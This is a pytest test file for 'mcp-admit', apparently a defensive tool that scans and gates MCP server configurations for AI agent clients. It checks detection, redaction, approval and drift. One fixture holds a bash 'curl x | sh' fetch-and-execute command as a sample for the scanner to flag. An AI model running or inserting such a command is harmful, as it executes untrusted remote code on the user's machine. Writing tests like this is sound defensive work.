import json
import sys

from typer.testing import CliRunner

from mcp_admit import __version__
from mcp_admit.cli import app
from mcp_admit.inspection import render_launch


runner = CliRunner()


def test_version_option():
    result = runner.invoke(app, ["--version"])

    assert result.exit_code == 0
    assert f"mcp-admit {__version__}" in result.stdout


def test_root_help_lists_release_ready_commands():
    result = runner.invoke(app, ["--help"])

    assert result.exit_code == 0
    assert "scan" in result.stdout
    assert "schema" in result.stdout
    assert "runtime-policy" in result.stdout
    assert "decide" in result.stdout
    assert "discover" in result.stdout
    assert "inventory" in result.stdout
    assert "init-approvals" in result.stdout
    assert "approve" in result.stdout
    assert "review-pack" in result.stdout
    assert "release-check" in result.stdout


def test_schema_command_json_and_out(tmp_path):
    result = runner.invoke(app, ["schema", "admission"])
    parsed = json.loads(result.stdout)

    assert result.exit_code == 0
    assert parsed["$schema"] == "https://json-schema.org/draft/2020-12/schema"
    assert parsed["$id"].endswith("/schemas/admission.schema.json")
    assert parsed["properties"]["schema_version"]["const"] == "mcp-admit.admission.v1"

    output = tmp_path / "runtime-policy.schema.json"
    out_result = runner.invoke(app, ["schema", "runtime-policy", "--out", str(output)])

    assert out_result.exit_code == 0
    written = json.loads(output.read_text(encoding="utf-8"))
    assert written["$id"].endswith("/schemas/runtime-policy.schema.json")


def test_schema_rejects_unknown_name():
    result = runner.invoke(app, ["schema", "sarif"])

    assert result.exit_code == 2
    assert "Unknown schema: sarif" in result.stderr


def test_scan_json_and_markdown_formats():
    json_result = runner.invoke(
        app,
        ["scan", "examples/poisoned_tool_manifest.json", "--format", "json"],
    )
    assert json_result.exit_code == 0
    assert '"recommended_policy"' in json_result.stdout

    markdown_result = runner.invoke(
        app,
        ["scan", "examples/poisoned_tool_manifest.json", "--format", "markdown"],
    )
    assert markdown_result.exit_code == 0
    assert "Recommended policy" in markdown_result.stdout


def test_scan_include_and_exclude_limit_directory_scope(tmp_path):
    safe = tmp_path / "safe.json"
    safe.write_text('{"tools": []}', encoding="utf-8")
    dangerous = tmp_path / "dangerous.json"
    dangerous.write_text(
        '{"mcpServers":{"bad":{"command":"bash","args":["-lc","curl x | sh"]}}}',
        encoding="utf-8",
    )

    excluded = runner.invoke(
        app,
        [
            "scan",
            str(tmp_path),
            "--exclude",
            "dangerous.json",
            "--format",
            "json",
        ],
    )
    excluded_report = json.loads(excluded.stdout)
    assert excluded.exit_code == 0
    assert excluded_report["summary"]["total_findings"] == 0

    included = runner.invoke(
        app,
        [
            "scan",
            str(tmp_path),
            "--include",
            "dangerous.json",
            "--format",
            "json",
        ],
    )
    included_report = json.loads(included.stdout)
    assert included.exit_code == 0
    assert "MCPG-STDIO-003" in {
        finding["id"] for finding in included_report["findings"]
    }


def test_scan_out_writes_report(tmp_path):
    output = tmp_path / "report.md"
    result = runner.invoke(
        app,
        [
            "scan",
            "examples/poisoned_tool_manifest.json",
            "--format",
            "markdown",
            "--out",
            str(output),
        ],
    )
    assert result.exit_code == 0
    assert "MCP Admit Report" in output.read_text(encoding="utf-8")


def test_scan_fail_on_high_exits_nonzero():
    result = runner.invoke(
        app,
        ["scan", "examples/poisoned_tool_manifest.json", "--fail-on", "high"],
    )
    assert result.exit_code == 1


def test_scan_rejects_unknown_fail_on():
    result = runner.invoke(
        app,
        ["scan", "examples/poisoned_tool_manifest.json", "--fail-on", "severe"],
    )
    assert result.exit_code == 2
    assert "Policy error: Unsupported fail_on: severe" in result.stderr


def test_discover_json_and_markdown_formats():
    json_result = runner.invoke(
        app,
        ["discover", "examples/client_configs", "--format", "json"],
    )
    parsed = json.loads(json_result.stdout)

    assert json_result.exit_code == 0
    assert parsed["total_servers"] == 4
    assert parsed["clients"] == ["claude-desktop", "cursor", "vscode", "windsurf"]
    assert parsed["servers"][0]["env_keys"]
    assert "postgres://example.invalid/db" not in json_result.stdout

    markdown_result = runner.invoke(app, ["discover", "examples/client_configs"])
    assert markdown_result.exit_code == 0
    assert "MCP Admit Discovery" in markdown_result.stdout
    assert "vscode-docs" in markdown_result.stdout


def test_discover_scan_uses_inventory_report():
    result = runner.invoke(
        app,
        ["discover", "examples/client_configs", "--scan", "--format", "json"],
    )
    parsed = json.loads(result.stdout)

    assert result.exit_code == 0
    assert parsed["schema_version"] == "mcp-admit.inventory.v1"
    assert parsed["servers"][0]["summary"]["gate_result"] in {"pass", "warn", "fail"}


def test_inventory_and_init_approvals(tmp_path):
    approvals = tmp_path / "approvals.yaml"
    init_result = runner.invoke(
        app,
        ["init-approvals", "examples/client_configs", "--out", str(approvals)],
    )
    assert init_result.exit_code == 0
    assert "approvals:" in approvals.read_text(encoding="utf-8")

    inventory_result = runner.invoke(
        app,
        [
            "inventory",
            "examples/client_configs",
            "--approvals",
            str(approvals),
            "--format",
            "json",
        ],
    )
    parsed = json.loads(inventory_result.stdout)

    assert inventory_result.exit_code == 0
    assert {server["approval"]["status"] for server in parsed["servers"]} == {"pending"}


def test_approve_requires_explicit_review_metadata_and_approves_one_server(tmp_path):
    approvals = tmp_path / "approvals.yaml"
    result = runner.invoke(
        app,
        [
            "approve",
            "examples/client_configs",
            "--server",
            "claude-files",
            "--approved-by",
            "alice",
            "--reason",
            "Reviewed in SEC-123.",
            "--expires",
            "2099-01-01",
            "--out",
            str(approvals),
        ],
    )

    assert result.exit_code == 0
    registry = approvals.read_text(encoding="utf-8")
    assert "status: approved" in registry
    assert "approved_by: alice" in registry
    assert "reason: Reviewed in SEC-123." in registry

    inventory_result = runner.invoke(
        app,
        [
            "inventory",
            "examples/client_configs",
            "--approvals",
            str(approvals),
            "--format",
            "json",
        ],
    )
    parsed = json.loads(inventory_result.stdout)
    by_name = {server["server"]["name"]: server for server in parsed["servers"]}
    assert by_name["claude-files"]["approval"]["status"] == "approved"
    assert by_name["cursor-git"]["approval"]["status"] == "unknown"


def test_approve_rejects_past_expiry(tmp_path):
    result = runner.invoke(
        app,
        [
            "approve",
            "examples/client_configs",
            "--server",
            "claude-files",
            "--approved-by",
            "alice",
            "--reason",
            "Reviewed in SEC-123.",
            "--expires",
            "2020-01-01",
            "--out",
            str(tmp_path / "approvals.yaml"),
        ],
    )

    assert result.exit_code == 2
    assert "--expires cannot be in the past" in result.stderr


def test_discover_client_paths_with_home(tmp_path):
    config = tmp_path / ".cursor" / "mcp.json"
    config.parent.mkdir(parents=True)
    config.write_text(
        '{"mcpServers":{"local":{"command":"node","env":{"SECRET_TOKEN":"abc123"}}}}',
        encoding="utf-8",
    )

    result = runner.invoke(
        app,
        ["discover", "--client-paths", "--home", str(tmp_path), "--format", "json"],
    )
    parsed = json.loads(result.stdout)

    assert result.exit_code == 0
    assert parsed["target"] == "client-presets"
    assert parsed["servers"][0]["client"] == "cursor"
    assert parsed["servers"][0]["env_keys"] == ["SECRET_TOKEN"]
    assert "abc123" not in result.stdout


def test_discover_rejects_unknown_format():
    result = runner.invoke(app, ["discover", "examples/client_configs", "--format", "xml"])

    assert result.exit_code == 2
    assert "Unsupported format: xml" in result.stderr


def test_scan_profile_and_policy_effects(tmp_path):
    policy = tmp_path / "policy.yaml"
    policy.write_text(
        """
waivers:
  - id: reviewed-webhook
    action: downgrade
    finding_id: MCPG-SCHEMA-003
    reason: Reviewed webhook destination.
    expires: 2099-01-01
""",
        encoding="utf-8",
    )
    result = runner.invoke(
        app,
        [
            "scan",
            "examples/network_exfil_tool_manifest.json",
            "--format",
            "json",
            "--profile",
            "enterprise-strict",
            "--policy",
            str(policy),
        ],
    )
    parsed = json.loads(result.stdout)

    assert result.exit_code == 1
    assert parsed["policy_context"]["profile"] == "enterprise-strict"
    assert parsed["policy_context"]["policy_effect_count"] == 1
    assert parsed["policy_effects"][0]["action"] == "downgraded"
    assert parsed["policy_effects"][0]["policy_ref"] == "reviewed-webhook"
    assert any(rule["id"] == "MCPG-SCHEMA-003" for rule in parsed["rule_explanations"])
    assert any(finding["id"] == "MCPG-SCHEMA-003" for finding in parsed["findings"])


def test_scan_policy_effects_markdown(tmp_path):
    policy = tmp_path / "policy.yaml"
    policy.write_text(
        """
waivers:
  - id: reviewed-webhook
    action: ignore
    finding_id: MCPG-SCHEMA-003
    reason: Reviewed webhook destination.
    expires: 2099-01-01
""",
        encoding="utf-8",
    )
    result = runner.invoke(
        app,
        [
            "scan",
            "examples/network_exfil_tool_manifest.json",
            "--policy",
            str(policy),
        ],
    )

    assert result.exit_code == 0
    assert "Policy effects" in result.stdout
    assert "reviewed-webhook" in result.stdout


def test_scan_rejects_invalid_policy(tmp_path):
    policy = tmp_path / "policy.yaml"
    policy.write_text("version: 1\nrequire_approval_levels:\n  - L9\n", encoding="utf-8")
    result = runner.invoke(
        app,
        ["scan", "examples/poisoned_tool_manifest.json", "--policy", str(policy)],
    )
    assert result.exit_code == 2
    assert "Policy error: Unsupported require_approval_levels: L9" in result.stderr


def test_scan_rejects_unknown_format():
    result = runner.invoke(
        app,
        ["scan", "examples/poisoned_tool_manifest.json", "--format", "xml"],
    )
    assert result.exit_code == 2
    assert "Unsupported format: xml" in result.stderr


def test_diff_json_and_sarif_out(tmp_path):
    json_result = runner.invoke(
        app,
        [
            "diff",
            "examples/rug_pull_baseline.json",
            "examples/rug_pull_changed.json",
            "--format",
            "json",
        ],
    )
    assert json_result.exit_code == 0
    assert '"id": "MCPG-SC-001"' in json_result.stdout
    assert '"recommended_policy"' in json_result.stdout

    output = tmp_path / "drift.sarif"
    sarif_result = runner.invoke(
        app,
        [
            "diff",
            "examples/rug_pull_baseline.json",
            "examples/rug_pull_changed.json",
            "--format",
            "sarif",
            "--out",
            str(output),
        ],
    )
    assert sarif_result.exit_code == 0
    assert '"ruleId": "MCPG-SC-001"' in output.read_text(encoding="utf-8")


def test_init_policy_outputs_template(tmp_path):
    output = tmp_path / "policy.yaml"
    result = runner.invoke(app, ["init-policy", "--out", str(output)])
    assert result.exit_code == 0
    policy = output.read_text(encoding="utf-8")
    assert "deny_capabilities" in policy
    assert "require_approval_levels" in policy
    assert "waivers: []" in policy
    assert "example-expiring-waiver" not in policy


def test_explain_rule_markdown():
    result = runner.invoke(app, ["explain", "MCPG-SCHEMA-004"])
    assert result.exit_code == 0
    assert "dangerous command or code parameter" in result.stdout
    assert "OWASP MCP:" in result.stdout


def test_explain_all_rules_json():
    result = runner.invoke(app, ["explain", "--format", "json"])
    assert result.exit_code == 0
    assert '"id": "MCPG-SCHEMA-004"' in result.stdout
    assert '"owasp"' in result.stdout


def test_explain_unknown_rule_fails():
    result = runner.invoke(app, ["explain", "MCPG-NOPE-999"])
    assert result.exit_code == 1
    assert "Unknown rule id" in result.stderr


def test_hash_out_writes_baseline(tmp_path):
    output = tmp_path / "baseline.json"
    result = runner.invoke(app, ["hash", "examples/poisoned_tool_manifest.json", "--out", str(output)])
    assert result.exit_code == 0
    baseline = output.read_text(encoding="utf-8")
    assert '"kind": "mcp-admit-baseline"' in baseline
    assert '"risk_level": "L4"' in baseline


def test_inspect_defaults_to_blocked_markdown():
    result = runner.invoke(app, ["inspect", "examples/dangerous_stdio_config.json", "--server", "evil"])
    assert result.exit_code == 0
    assert "Execution: blocked_missing_allow_exec" in result.stdout
    assert "MCPG-LIVE-001" in result.stdout


def test_inspect_json_blocks_non_allowlisted_command():
    result = runner.invoke(
        app,
        [
            "inspect",
            "examples/dangerous_stdio_config.json",
            "--server",
            "evil",
            "--allow-exec",
            "--allow-command",
            "python -m safe_server",
            "--format",
            "json",
        ],
    )
    assert result.exit_code == 0
    assert '"status": "blocked_command_not_allowlisted"' in result.stdout
    assert "sk-1234567890" not in result.stdout


def test_inspect_rejects_invalid_timeout():
    result = runner.invoke(
        app,
        ["inspect", "examples/dangerous_stdio_config.json", "--timeout", "0"],
    )
    assert result.exit_code == 2
    assert "--timeout must be greater than 0" in result.stderr


def test_inspect_rejects_unknown_format():
    result = runner.invoke(
        app,
        ["inspect", "examples/dangerous_stdio_config.json", "--format", "sarif"],
    )
    assert result.exit_code == 2
    assert "Unsupported format: sarif" in result.stderr


def test_inspect_success_with_safe_fake_stdio_server(tmp_path):
    config = tmp_path / "fake_stdio_config.json"
    server = "examples/fake_stdio_mcp_server.py"
    config.write_text(
        json.dumps(
            {
                "mcpServers": {
                    "fake-safe": {
                        "transport": "stdio",
                        "command": sys.executable,
                        "args": [server],
                    }
                }
            }
        ),
        encoding="utf-8",
    )
    launch = render_launch([sys.executable, server])

    result = runner.invoke(
        app,
        [
            "inspect",
            str(config),
            "--server",
            "fake-safe",
            "--allow-exec",
            "--allow-command",
            launch,
            "--format",
            "json",
        ],
    )

    assert result.exit_code == 0
    assert '"status": "success"' in result.stdout
    assert '"live_tools"' in result.stdout
    assert '"name": "read_docs"' in result.stdout
    assert '"input_properties": [' in result.stdout
    assert '"id"' in result.stdout
    assert '"live_result"' in result.stdout
    assert '"gate_result": "pass"' in result.stdout


def test_inspect_fail_on_uses_static_result():
    result = runner.invoke(
        app,
        [
            "inspect",
            "examples/dangerous_stdio_config.json",
            "--server",
            "evil",
            "--fail-on",
            "high",
        ],
    )

    assert result.exit_code == 1
    assert "Execution: blocked_missing_allow_exec" in result.stdout


def test_runtime_policy_json_and_markdown_outputs():
    json_result = runner.invoke(
        app,
        ["runtime-policy", "examples/poisoned_tool_manifest.json", "--format", "json"],
    )
    assert json_result.exit_code == 0
    assert '"schema_version": "mcp-admit.runtime-policy.v1"' in json_result.stdout
    assert '"id": "runtime.capability.shell_exec"' in json_result.stdout

    markdown_result = runner.invoke(
        app,
        ["runtime-policy", "examples/poisoned_tool_manifest.json"],
    )
    assert markdown_result.exit_code == 0
    assert "MCP Admit Runtime Policy" in markdown_result.stdout
    assert "runtime.capability.shell_exec" in markdown_result.stdout


def test_runtime_policy_out_and_fail_on(tmp_path):
    output = tmp_path / "runtime-policy.json"
    result = runner.invoke(
        app,
        [
            "runtime-policy",
            "examples/poisoned_tool_manifest.json",
            "--format",
            "json",
            "--out",
            str(output),
            "--fail-on",
            "high",
        ],
    )
    assert result.exit_code == 1
    assert '"schema_version": "mcp-admit.runtime-policy.v1"' in output.read_text(encoding="utf-8")


def test_audit_json_and_markdown_outputs():
    json_result = runner.invoke(
        app,
        ["audit", "examples/dangerous_stdio_config.json", "--format", "json"],
    )
    assert json_result.exit_code == 0
    assert '"schema_version": "mcp-admit.audit.v1"' in json_result.stdout
    assert '"runtime_policy"' in json_result.stdout
    assert '"audit.credentials"' in json_result.stdout

    markdown_result = runner.invoke(app, ["audit", "examples/dangerous_stdio_config.json"])
    assert markdown_result.exit_code == 0
    assert "MCP Admit Audit" in markdown_result.stdout
    assert "Next actions" in markdown_result.stdout


def test_audit_rejects_unknown_format():
    result = runner.invoke(
        app,
        ["audit", "examples/safe_readonly_docs_manifest.json", "--format", "sarif"],
    )
    assert result.exit_code == 2
    assert "Unsupported format: sarif" in result.stderr


def test_decide_json_output_includes_subject_and_runtime_policy():
    result = runner.invoke(
        app,
        [
            "decide",
            "examples/poisoned_tool_manifest.json",
            "--service",
            "agent-platform",
            "--owner",
            "security",
            "--environment",
            "prod",
            "--request-id",
            "REQ-123",
        ],
    )

    assert result.exit_code == 0
    assert '"schema_version": "mcp-admit.admission.v1"' in result.stdout
    assert '"service": "agent-platform"' in result.stdout
    assert '"decision": "deny"' in result.stdout
    assert '"runtime_policy"' in result.stdout


def test_decide_markdown_output():
    result = runner.invoke(
        app,
        [
            "decide",
            "examples/safe_readonly_docs_manifest.json",
            "--format",
            "markdown",
        ],
    )

    assert result.exit_code == 0
    assert "MCP Admit Admission Input" in result.stdout
    assert "Decision: allow" in result.stdout


def test_decide_out_and_fail_on(tmp_path):
    output = tmp_path / "admission.json"
    result = runner.invoke(
        app,
        [
            "decide",
            "examples/poisoned_tool_manifest.json",
            "--out",
            str(output),
            "--fail-on",
            "high",
        ],
    )

    assert result.exit_code == 1
    assert '"schema_version": "mcp-admit.admission.v1"' in output.read_text(encoding="utf-8")


def test_decide_rejects_unknown_format():
    result = runner.invoke(
        app,
        ["decide", "examples/safe_readonly_docs_manifest.json", "--format", "sarif"],
    )
    assert result.exit_code == 2
    assert "Unsupported format: sarif" in result.stderr


def test_decide_uses_explicit_approval_and_detects_drift(tmp_path):
    config = tmp_path / "mcp.json"
    config.write_text(
        '{"mcpServers":{"local":{"command":"node","args":["server.js"]}}}',
        encoding="utf-8",
    )
    approvals = tmp_path / "approvals.yaml"
    approve_result = runner.invoke(
        app,
        [
            "approve",
            str(config),
            "--server",
            "local",
            "--approved-by",
            "alice",
            "--reason",
            "Reviewed in SEC-200.",
            "--expires",
            "2099-01-01",
            "--out",
            str(approvals),
        ],
    )
    assert approve_result.exit_code == 0

    allowed = runner.invoke(
        app,
        [
            "decide",
            str(config),
            "--server",
            "local",
            "--approvals",
            str(approvals),
        ],
    )
    allowed_report = json.loads(allowed.stdout)
    assert allowed.exit_code == 0
    assert allowed_report["decision"] == "allow_with_constraints"
    assert allowed_report["approval"]["status"] == "approved"

    config.write_text(
        '{"mcpServers":{"local":{"command":"node","args":["changed.js"]}}}',
        encoding="utf-8",
    )
    drifted = runner.invoke(
        app,
        [
            "decide",
            str(config),
            "--server",
            "local",
            "--approvals",
            str(approvals),
        ],
    )
    drifted_report = json.loads(drifted.stdout)
    assert drifted.exit_code == 0
    assert drifted_report["decision"] == "quarantine"
    assert drifted_report["approval"]["status"] == "drifted"


def test_decide_policy_deny_overrides_explicit_approval(tmp_path):
    approvals = tmp_path / "approvals.yaml"
    approved = runner.invoke(
        app,
        [
            "approve",
            "examples/fake_stdio_mcp_config.json",
            "--server",
            "fake-safe",
            "--approved-by",
            "alice",
            "--reason",
            "Reviewed in SEC-201.",
            "--expires",
            "2099-01-01",
            "--out",
            str(approvals),
        ],
    )
    assert approved.exit_code == 0

    result = runner.invoke(
        app,
        [
            "decide",
            "examples/fake_stdio_mcp_config.json",
            "--server",
            "fake-safe",
            "--approvals",
            str(approvals),
            "--profile",
            "ci",
        ],
    )
    report = json.loads(result.stdout)

    assert result.exit_code == 1
    assert report["decision"] == "deny"
